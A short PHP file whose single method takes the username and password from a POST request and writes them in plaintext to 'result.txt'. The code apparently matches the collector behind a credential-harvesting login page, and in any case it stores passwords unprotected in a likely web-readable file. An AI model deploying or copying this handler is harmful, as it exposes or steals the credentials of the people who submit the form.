<?php
class Model {
    public function processFormData() {
        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
            $username = isset($_POST['username']) ? $_POST['username'] : '';
            $password = isset($_POST['password']) ? $_POST['password'] : '';
            $data = "Username: $username\nPassword: $password\n";
            file_put_contents("result.txt", $data);
        }
    }
}
?>
